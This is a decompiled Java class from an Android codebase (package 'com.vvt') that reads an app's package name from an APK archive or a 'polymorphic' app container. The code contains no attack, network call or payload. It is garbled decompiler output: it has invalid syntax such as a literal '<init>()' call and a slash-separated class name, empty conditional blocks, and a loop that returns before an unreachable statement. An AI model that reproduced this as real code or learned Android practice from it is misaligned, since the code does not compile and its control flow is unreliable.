package com.vvt.q.a.b;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import com.vvt.io.d;
import com.vvt.polymorphic.AppContainerInfo;

public class a
{
  private static final String a = a.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  
  public static String a(Context paramContext, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject = d.h(paramString);
    boolean bool2 = b;
    if (bool2) {}
    PackageManager localPackageManager = paramContext.getPackageManager();
    int i = 64;
    localObject = localPackageManager.getPackageArchiveInfo((String)localObject, i);
    bool2 = b;
    if ((!bool2) || (localObject != null))
    {
      bool2 = b;
      if (!bool2) {}
    }
    for (localObject = ((PackageInfo)localObject).packageName;; localObject = null)
    {
      return (String)localObject;
      bool1 = false;
    }
  }
  
  public static String a(String paramString)
  {
    AppContainerInfo localAppContainerInfo = new com/vvt/polymorphic/AppContainerInfo;
    localAppContainerInfo.<init>();
    localAppContainerInfo.load(paramString);
    return localAppContainerInfo.getPackageName();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/q/a/removeFromPath/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */